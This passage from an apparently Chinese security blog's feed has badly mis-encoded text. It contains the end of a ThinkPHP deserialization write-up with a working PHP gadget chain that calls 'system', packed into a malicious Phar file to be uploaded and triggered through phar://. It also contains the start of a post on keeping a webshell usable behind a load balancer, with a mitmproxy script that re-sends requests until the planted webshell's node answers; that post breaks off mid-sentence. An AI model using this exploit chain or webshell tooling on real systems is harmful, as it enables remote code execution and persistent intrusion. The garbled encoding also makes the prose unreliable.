class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5thinkphp61xååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#5thinkphp61xååºåˆ—åŒ–"></a> â‘¤ThinkPHP6.1.xååºåˆ—åŒ–</h2><p>æµ‹è¯•ç‰ˆæœ¬6.1.4</p><p>tp6.0çš„é“¾å¯ä»¥é€šç”¨</p><ul><li>å‘½ä»¤æ‰§è¡Œ</li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918142423600.png" alt="image-20240918142423600" /></p><ul><li><p>å†™æ–‡ä»¶</p><p>6.1 ç‰ˆæœ¬é»˜è®¤ä¸æºå¸¦Flysytemç±»ï¼Œå¯¼è‡´ä¸Šé¢åˆ†æçš„å†™æ–‡ä»¶é“¾æ— æ³•å†æ¬¡ä½¿ç”¨ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918143955561.png" alt="image-20240918143955561" /></p></li></ul><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918143857435.png" alt="image-20240918143857435" /></p><h2 id="6thinkphp80xååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#6thinkphp80xååºåˆ—åŒ–"></a> â‘¥ThinkPHP8.0.xååºåˆ—åŒ–</h2><p><a href="https://xz.aliyun.com/t/14904">https://xz.aliyun.com/t/14904</a></p><p>æš‚æ—¶ä¸è‡ªå·±åˆ†æäº†ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡æ–‡ç« ï¼Œå…¶å®ä¸Šé¢åˆ†æäº†è¿™ä¹ˆå¤šæ¡é“¾ã€‚è‡ªå·±æŒ–æ˜ä¹Ÿå°±å¾ˆç®€å•äº†</p><p>æ–‡ç« ä¸­ä¹Ÿæ˜¯toStringèµ°åˆ°callï¼Œç„¶åèµ°åˆ°callbackçš„sinkç‚¹ï¼Œå®Œæˆäº†åˆ©ç”¨ã€‚</p><p>ä¸»è¦éš¾ç‚¹åœ¨äºifæ¡ä»¶çš„æ„é€ ï¼Œç¡®å®æ˜¯ä¸ªéº»çƒ¦çš„å¤§å·¥ç¨‹ã€‚</p><p>é¡ºå¸¦æ¨èä¸€ä¸ªé¢˜ç›®ï¼šå¼ºç½‘æ¯pop_master</p><h1 id="0x02-å®æˆ˜åˆ©ç”¨"><a class="markdownIt-Anchor" href="#0x02-å®æˆ˜åˆ©ç”¨"></a> 0x02 å®æˆ˜åˆ©ç”¨</h1><p>åˆšå¼€å§‹å­¦ååºåˆ—åŒ–çš„æ—¶å€™ä¸€ç›´æœ‰ç–‘é—®ï¼Œtpçš„ååºåˆ—åŒ–æ¼æ´å¦‚ä½•åˆ©ç”¨å‘¢ï¼Ÿï¼Ÿä¸ºä»€ä¹ˆç½‘ç»œä¸Šéƒ½æ˜¯åˆ†æpopé“¾ï¼Œè€Œå¾ˆå°‘æœ‰å®æˆ˜çš„ä¾‹å­å‘¢ï¼Ÿ</p><p>å…¶å®è¿™ä¹Ÿå°±å¼•å‡ºäº†ååºåˆ—åŒ–æ¼æ´çš„å‰æï¼š</p><ul><li>å­˜åœ¨ååºåˆ—åŒ–popé“¾</li><li>å­˜åœ¨ååºåˆ—åŒ–çš„å…¥å£ï¼Œä¹Ÿå°±æ˜¯æ¥æ”¶æ•°æ®å¹¶è¿›è¡Œååºåˆ—åŒ–çš„æ“ä½œã€‚</li></ul><p>å› ä¸ºtpå®è´¨ä¸Šæ˜¯ä¸€ä¸ªæ¡†æ¶ï¼Œæ‰€ä»¥ä½ å¹¶ä¸çŸ¥é“å¼€å‘è€…å¯èƒ½å¦‚ä½•å†™ä¸šåŠ¡ï¼Œå¦‚æœä¸šåŠ¡ä¸­æ¶‰åŠåˆ°å¤„ç†å¯¹è±¡ï¼Œé‚£å°±å¾ˆæœ‰å¯èƒ½å†™äº†ååºåˆ—åŒ–çš„å…¥å£ã€‚</p><p>æ€»ç»“ä¸€ä¸‹ï¼Œå®æˆ˜ä¸­çš„å…¥å£ä¸»è¦æœ‰å¦‚ä¸‹ï¼š</p><h2 id="åŸç”Ÿååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#åŸç”Ÿååºåˆ—åŒ–"></a> åŸç”Ÿååºåˆ—åŒ–</h2><p>å­—é¢æ„æ€</p><p>phpè‡ªå¸¦çš„unserializeæ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918151516506.png" alt="image-20240918151516506" /></p><h2 id="redisæ¨¡å—"><a class="markdownIt-Anchor" href="#redisæ¨¡å—"></a> Redisæ¨¡å—</h2><p>æ—¢ç„¶è‡ªå¸¦äº†unserializeæ–¹æ³•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å»tpæ¡†æ¶æœç´¢ä¸€ä¸‹è¯¥æ–¹æ³•ï¼Œæœ‰æ²¡æœ‰ä»€ä¹ˆæ–¹æ³•æ˜¯å°è£…äº†è¿™ä¸ªå‡½æ•°çš„å‘¢ï¼Ÿ</p><ul><li>ä¸éš¾å‘ç°redisæ¨¡å—çš„getæ–¹æ³•è·å–é”®å€¼çš„æ—¶å€™æ˜¯è°ƒç”¨ååºåˆ—åŒ–æ–¹æ³•çš„</li></ul><p>å€¼ä»¥think_serializeå¼€å§‹ä¼šè¿›è¡Œååºåˆ—åŒ–</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918152247395.png" alt="image-20240918152247395" /></p><p><strong>å½“ç„¶é«˜ç‰ˆæœ¬çš„getæ–¹æ³•å®ç°èµ·æ¥åˆä¸ä¸€æ ·äº†ï¼Œtp6æ˜¯å¦ä¸€å¥—å†™æ³•ï¼Œtp5è¿™ä¸ªå®æˆ˜æ¯”è¾ƒå¤šï¼Œå°±æ‹¿è¿™ä¸ªä¸¾ä¾‹äº†</strong></p><h2 id="sessionååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#sessionååºåˆ—åŒ–"></a> Sessionååºåˆ—åŒ–</h2><p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p><p>ctfæ¯”è¾ƒå¸¸è§</p><p>å½“ç„¶å®æˆ˜ä¸­ä¹Ÿæœ‰äº§å“èƒ½é‡åˆ°ï¼Œæ¯”å¦‚ï¼š<strong>ç‘å‹å¤©ç¿¼åº”ç”¨è™šæ‹ŸåŒ–</strong></p><h2 id="pharååºåˆ—åŒ–"><a class="markdownIt-Anchor" href="#pharååºåˆ—åŒ–"></a> Pharååºåˆ—åŒ–</h2><p>pharååºåˆ—åŒ–æ˜¯å®æˆ˜ä¸­çš„å¤§å¤´ï¼Œå…ˆç®€å•æ€»ç»“ä¸€ä¸‹ï¼Œpharæ–‡ä»¶çš„metadataéƒ¨åˆ†å­˜å‚¨çš„æ˜¯ååºåˆ—åŒ–æ•°æ®ï¼Œå½“ä½¿ç”¨pharåè®®å¤„ç†æ–‡ä»¶æ—¶ï¼Œä¼šå¯¹è¿™éƒ¨åˆ†æ•°æ®è¿›è¡Œååºåˆ—åŒ–ã€‚ï¼ˆ<strong>PHP8å·²ç»åšäº†ä¿®å¤</strong>ï¼‰</p><p>ä¸»è¦å½±å“çš„å‡½æ•°å°±æ˜¯æ–‡ä»¶æ“ä½œç›¸å…³çš„ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5C20191105195413-fc4b3ca0-ffc2-1.png" alt="20191105195413-fc4b3ca0-ffc2-1" /></p><p>å®é™…ä¸Šå¾ˆå¥½ç†è§£ï¼š</p><ol><li>ç”Ÿæˆæ¶æ„çš„pharæ–‡ä»¶ã€‚ï¼ˆåç¼€æ— è¦æ±‚ï¼‰</li></ol><p>ä»£ç ä¸ŠåŠéƒ¨åˆ†æ˜¯ä¸Šé¢åˆ†æçš„popé“¾ã€‚</p><p>ä¸‹åŠéƒ¨åˆ†é‡ç‚¹æŠŠmetadataéƒ¨åˆ†è®¾ç½®æˆpopé“¾çš„å¯¹è±¡å³å¯ã€‚</p><pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?phpnamespace think &#123;        abstract class Model &#123;                private $lazySave &#x3D; false;        private $data &#x3D; [];        private $exists &#x3D; false;        protected $table;        private $withAttr &#x3D; [];        protected $json &#x3D; [];        protected $jsonAssoc &#x3D; false;                public function __construct($obj&#x3D;&#39;&#39;) &#123;            $this-&gt;lazySave &#x3D; true;            $this-&gt;data &#x3D; [&#39;calc&#39;&#x3D;&gt;[&#39;calc&#39;]];            $this-&gt;exists &#x3D; true;            $this-&gt;table &#x3D; $obj;                $this-&gt;withAttr &#x3D; [&#39;calc&#39;&#x3D;&gt;[&#39;system&#39;]];            $this-&gt;json &#x3D; [&#39;calc&#39;];            $this-&gt;jsonAssoc &#x3D; true;        &#125;    &#125;&#125;namespace think\model &#123;    use think\Model;    class Pivot extends Model &#123;    &#125;   &#125;namespace&#123;        $p &#x3D; new \think\model\Pivot(new \think\model\Pivot());    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;ä»£ç é‡Œé¢å¿…é¡»æ˜¯pharåç¼€ï¼Œç”Ÿæˆå®Œä½¿ç”¨ä¼ªåè®®è§¦å‘ä¸éœ€è€ƒè™‘åç¼€    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;è®¾ç½®stub    $phar-&gt;setMetadata($p); &#x2F;&#x2F;è‡ªå®šä¹‰metadata    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F; æ·»åŠ æ–‡ä»¶    &#x2F;&#x2F;ç­¾åè‡ªåŠ¨è®¡ç®—    $phar-&gt;stopBuffering();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>ä¼ªåè®®è§¦å‘ï¼ˆå®æˆ˜ä¸­éœ€è¦è‡ªå·±å°è¯•ä¸Šä¼ æ–‡ä»¶ï¼‰</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240918161944044.png" alt="image-20240918161944044" /></p><p><strong>åˆ†æåˆ°è¿™é‡Œä¹Ÿèƒ½çœ‹åˆ°ï¼Œæˆ‘ä»¬ä»£ç ä¸­å¿…é¡»æ˜¯æ•´ä¸ªå‚æ•°éƒ½å¯ä»¥æ§åˆ¶ï¼Œè¿™æ ·æ‰èƒ½æ§åˆ¶pharå‰ç¼€</strong></p><h1 id="å‚è€ƒé“¾æ¥"><a class="markdownIt-Anchor" href="#å‚è€ƒé“¾æ¥"></a> å‚è€ƒé“¾æ¥</h1><p><a href="https://blog.riskivy.com/%e6%8c%96%e6%8e%98%e6%9a%97%e8%97%8fthinkphp%e4%b8%ad%e7%9a%84%e5%8f%8d%e5%ba%8f%e5%88%97%e5%88%a9%e7%94%a8%e9%93%be/">https://blog.riskivy.com/æŒ–æ˜æš—è—thinkphpä¸­çš„ååºåˆ—åˆ©ç”¨é“¾/</a></p><p><a href="https://www.anquanke.com/post/id/251318#h2-2">https://www.anquanke.com/post/id/251318#h2-2</a></p><p><a href="https://xz.aliyun.com/t/8163">https://xz.aliyun.com/t/8163</a></p><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">https://github.com/Mochazz/ThinkPHP-Vuln/</a></p><p><a href="https://xz.aliyun.com/t/11382">https://xz.aliyun.com/t/11382</a></p><p><a href="https://xz.aliyun.com/t/9310">https://xz.aliyun.com/t/9310</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-ååºåˆ—åŒ–åˆ©ç”¨é“¾&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#0x01-ååºåˆ—åŒ–åˆ©ç”¨é“¾&quot;&gt;&lt;/a&gt; 0x01 ååºåˆ—åŒ–åˆ©ç”¨é“¾&lt;/h1&gt;
&lt;h2 id=&quot;å®¡è®¡æ€è·¯&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; hr</summary>
      
    
    
    
    
    <category term="ThinkPHP" scheme="https://cyxsec.github.io/tags/ThinkPHP/"/>
    
  </entry>
  
  <entry>
    <title>è´Ÿè½½å‡è¡¡ä¸‹çš„Webshellè¿æ¥</title>
    <link href="https://cyxsec.github.io/2023/10/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84Webshell%E8%BF%9E%E6%8E%A5/"/>
    <id>https://cyxsec.github.io/2023/10/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84Webshell%E8%BF%9E%E6%8E%A5/</id>
    <published>2023-10-22T05:51:39.000Z</published>
    <updated>2024-07-22T08:47:53.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-åº"><a class="markdownIt-Anchor" href="#0x00-åº"></a> 0x00 åº</h1><p>æœ€è¿‘æ‰“é‡‘èé¡¹ç›®çš„æ—¶å€™ï¼Œwebshellé‡è§äº†è´Ÿè½½å‡è¡¡ï¼Œè‡ªå·±ä¹‹å‰å…¶å®çœ‹è¿‡ç›¸å…³æ–‡ç« ï¼Œä½†æ˜¯å®æˆ˜æ“ä½œèµ·æ¥è¿˜æ˜¯é‡è§äº†ä¸å°‘å‘ç‚¹çš„ï¼Œæ¥ä¸‹æ¥å°±æ ¹æ®å‰äººçš„æ–‡ç« ï¼ŒåŒæ—¶ç»“åˆå®æˆ˜å’Œè‡ªå·±çš„æ€è€ƒï¼Œå†™äº†æœ¬ç¯‡æ–‡ç« ã€‚</p><h1 id="0x01-ä»€ä¹ˆæ˜¯è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#0x01-ä»€ä¹ˆæ˜¯è´Ÿè½½å‡è¡¡"></a> 0x01 ä»€ä¹ˆæ˜¯è´Ÿè½½å‡è¡¡</h1><p>è´Ÿè½½å‡è¡¡æ˜¯ä¸€ç§å°†æ¥è‡ªå¤šä¸ªç”¨æˆ·æˆ–åº”ç”¨ç¨‹åºçš„è¯·æ±‚åˆ†é…åˆ°å¤šä¸ªæœåŠ¡å™¨æˆ–è®¾å¤‡ä¸Šçš„æŠ€æœ¯ï¼Œä»¥æé«˜æ•´ä½“æ€§èƒ½ã€å¯ç”¨æ€§å’Œå¯æ‰©å±•æ€§ã€‚å®ƒå°±åƒäº¤é€šç®¡åˆ¶å‘˜ï¼Œå¯ä»¥å°†æµé‡åˆ†æ•£åˆ°ä¸åŒçš„é“è·¯ä¸Šï¼Œé¿å…ä»»ä½•ä¸€æ¡é“è·¯å µå¡ã€‚</p><p>åœ¨äº’è”ç½‘åº”ç”¨ä¸­ï¼Œè´Ÿè½½å‡è¡¡é€šå¸¸ç”¨äºå°†æ¥è‡ªç”¨æˆ·çš„è¯·æ±‚åˆ†å‘åˆ°å¤šå° Web æœåŠ¡å™¨ã€‚è¿™å¯ä»¥æé«˜ç½‘ç«™çš„æ€§èƒ½å’Œå“åº”é€Ÿåº¦ï¼Œå¹¶ç¡®ä¿å³ä½¿åœ¨é«˜æµé‡æƒ…å†µä¸‹ä¹Ÿèƒ½ä¿æŒæ­£å¸¸è¿è¡Œã€‚æ­¤å¤–ï¼Œè´Ÿè½½å‡è¡¡è¿˜å¯ä»¥æé«˜åº”ç”¨ç¨‹åºçš„å¯ç”¨æ€§ï¼Œå¦‚æœä¸€å°æœåŠ¡å™¨å‡ºç°æ•…éšœï¼Œå…¶ä»–æœåŠ¡å™¨å¯ä»¥ç»§ç»­å¤„ç†è¯·æ±‚è€Œä¸ä¼šä¸­æ–­æœåŠ¡ã€‚</p><p>æ‹¿å¸¸è§nginxå®ç°LBSæ¥è¯´ï¼š</p><p><img src="../../../typora-user-images/image-20240722143117448.png" alt="image-20240722143117448" /></p><p>ç®€å•æ€»ç»“å°±æ˜¯ï¼šæˆ‘ä»¬è®¿é—®çš„webshellæ˜¯é€šè¿‡nginxè½¬å‘è¿‡å»çš„ï¼Œwebshellçš„å®é™…å¤„ç†ï¼Œnginxä¼šé»˜è®¤å¯¹è´Ÿè½½èŠ‚ç‚¹è¿›è¡Œè½®è¯¢è¯·æ±‚ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è®¿é—®webshellå¯èƒ½ä¸€ä¼šåœ¨node1ï¼Œä¸€ä¼šåœ¨node2ã€‚</p><p>é‚£ä¹ˆåˆ†è¾¨æ˜¯å¦é‡‡ç”¨äº†è¿™ç§æŠ€æœ¯ä¹Ÿå¾ˆç®€å•ï¼š</p><ol><li>æˆ‘ä»¬ä½¿ç”¨webshellæ‰§è¡Œå‘½ä»¤ï¼Œå‘ç°æŸ¥è¯¢åˆ°çš„å†…ç½‘ipä¸€ç›´åœ¨å˜åŒ–</li><li>æˆ‘ä»¬æŸ¥çœ‹ç›®å½•æ–‡ä»¶æ—¶ï¼Œå‘ç°åˆ·æ–°ä¸€æ¬¡ï¼Œç›®å½•å°±å‘ç”Ÿå˜åŒ–äº†</li></ol><h2 id="è´Ÿè½½å‡è¡¡çš„é—®é¢˜åœ¨å“ªé‡Œ"><a class="markdownIt-Anchor" href="#è´Ÿè½½å‡è¡¡çš„é—®é¢˜åœ¨å“ªé‡Œ"></a> è´Ÿè½½å‡è¡¡çš„é—®é¢˜åœ¨å“ªé‡Œï¼Ÿ</h2><p>æ ¹æ®æˆ‘ä»¬ä¸Šé¢çš„ä»‹ç»ï¼Œæˆ‘ä»¬çš„webshellè¯·æ±‚ä¼šéšæœºè¯·æ±‚åˆ°å†…éƒ¨æœªçŸ¥çš„nodeç‚¹ã€‚</p><p>åœ¨å¦‚ä¸‹çš„webshellåœºæ™¯ä¸­</p><ol><li>æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ä½¿ç”¨çš„æ˜¯å°†æ–‡ä»¶åˆ†å—å†™å…¥ï¼ˆä¸­é—´ä»¶ä¼šé™åˆ¶dataå¤§å°ï¼Œå¤§æ–‡ä»¶å¿…é¡»åˆ†å—ï¼‰ï¼Œå› ä¸ºæ˜¯ä¸åŒçš„nodeèŠ‚ç‚¹å¤„ç†ï¼Œæ–‡ä»¶åˆ†å—ä¹Ÿå°±å¯¼è‡´ï¼Œfile_piece1å†™å…¥åˆ°äº†node1èŠ‚ç‚¹ï¼Œfile_piece2å†™å…¥åˆ°äº†node2èŠ‚ç‚¹ã€‚æ— æ³•è½åœ°å¤§æ–‡ä»¶ã€‚</li></ol><h1 id="0x02-æœªåšæ–‡ä»¶åŒæ­¥çš„è´Ÿè½½å‡è¡¡"><a class="markdownIt-Anchor" href="#0x02-æœªåšæ–‡ä»¶åŒæ­¥çš„è´Ÿè½½å‡è¡¡"></a> 0x02 æœªåšæ–‡ä»¶åŒæ­¥çš„è´Ÿè½½å‡è¡¡</h1><p>è¿™ä¹Ÿæ˜¯æœ¬æ¬¡è‡ªå·±å®æˆ˜ä¸­é‡åˆ°çš„æƒ…å†µï¼Œ æœªåšæ–‡ä»¶åŒæ­¥ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä¸Šä¼ webshellï¼Œè¯·æ±‚å¤„ç†ååªè½åœ°åœ¨äº†å…¶ä¸­çš„æŸä¸€ä¸ªnodeèŠ‚ç‚¹ã€‚</p><p>è¿™ä¹Ÿå°±å¯¼è‡´ï¼Œè¯·æ±‚ä¸€ä¼š200ï¼ˆè½®è¯¢åˆ°äº†è½åœ°webshellçš„nodeèŠ‚ç‚¹ï¼‰ï¼Œä¸€ä¼š404ï¼ˆæœªè½®è¯¢åˆ°è½åœ°webshellçš„nodeèŠ‚ç‚¹ï¼‰ã€‚</p><h2 id="mitmproxyå¾ªç¯è¯·æ±‚"><a class="markdownIt-Anchor" href="#mitmproxyå¾ªç¯è¯·æ±‚"></a> mitmproxyå¾ªç¯è¯·æ±‚</h2><p>å½“æ—¶æƒ³çš„ç¬¬ä¸€ç§ç®€ä¾¿æ˜“è¡Œçš„æ–¹å¼å°±æ˜¯å†™è„šæœ¬ã€å¾ªç¯åˆ¤æ–­ï¼Œå½“å‰è¯·æ±‚ä¸º404æ—¶å°±å¾ªç¯è¯·æ±‚ï¼Œç›´åˆ°è¯·æ±‚æ–¹å¼ä¸º200ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬ä¿è¯äº†æ‰€æœ‰çš„è¯·æ±‚éƒ½åˆ°äº†è½åœ°webshellçš„nodeèŠ‚ç‚¹ï¼Œä¹Ÿèƒ½ä¿è¯å¤§æ–‡ä»¶çš„ä¸Šä¼ </p><p>demo:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> mitmproxy <span class="token keyword">import</span> ctx<span class="token punctuation">,</span> http<span class="token keyword">import</span> requests<span class="token keyword">class</span> <span class="token class-name">ProxyAddon</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token comment"># åªå¤„ç†POSTè¯·æ±‚</span>        <span class="token keyword">if</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>            url <span class="token operator">=</span> self<span class="token punctuation">.</span>get_https_url<span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>host<span class="token punctuation">,</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span>            <span class="token comment"># æ‰“å°è½¬å‘å‰çš„è¯·æ±‚å†…å®¹</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Original Request:"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># å‘é€POSTè¯·æ±‚åˆ°ç›®æ ‡HTTPSæœåŠ¡å™¨</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    response <span class="token operator">=</span> self<span class="token punctuation">.</span>make_https_request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content<span class="token punctuation">)</span>                    <span class="token keyword">break</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    response <span class="token operator">=</span> self<span class="token punctuation">.</span>make_https_request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content<span class="token punctuation">)</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">break</span>                    <span class="token keyword">continue</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                                <span class="token comment"># æ‰“å°è½¬å‘åçš„å“åº”å†…å®¹</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Forwarded Response:"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># å°†HTTPSå“åº”è¿”å›ç»™ç›‘å¬</span>            headers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            flow<span class="token punctuation">.</span>response <span class="token operator">=</span> http<span class="token punctuation">.</span>Response<span class="token punctuation">.</span>make<span class="token punctuation">(</span>                <span class="token number">200</span><span class="token punctuation">,</span>                response<span class="token punctuation">.</span>content<span class="token punctuation">,</span>                headers            <span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">make_https_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        proxies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'http'</span><span class="token punctuation">:</span><span class="token string">'http://127.0.0.1:8080'</span><span class="token punctuation">,</span>                   <span class="token string">'https'</span><span class="token punctuation">:</span><span class="token string">'https://127.0.0.1:8080'</span><span class="token punctuation">&#125;</span>        <span class="token comment"># è‡ªå®šä¹‰è¶…æ—¶æ—¶é—´ä¸º10ç§’</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> response    <span class="token keyword">def</span> <span class="token function">get_https_url</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># æ ¹æ®éœ€è¦ä¿®æ”¹ä¸ºç›¸åº”çš„HTTPSåœ°å€</span>        https_host <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>https_host<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>addons <span class="token operator">=</span> <span class="token punctuation">[</span>    ProxyAddon<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™ä¸ªæ–¹å¼è¿˜æœ‰ä¸¤ä¸ªæœ‰æ„æ€çš„ç‚¹éœ€è¦è¯´ä¸€ä¸‹ï¼š</p><ol><li>éœ€è¦è®¾ç½®webshellå·¥å…·çš„è¶…æ—¶æ—¶é—´ï¼Œå› 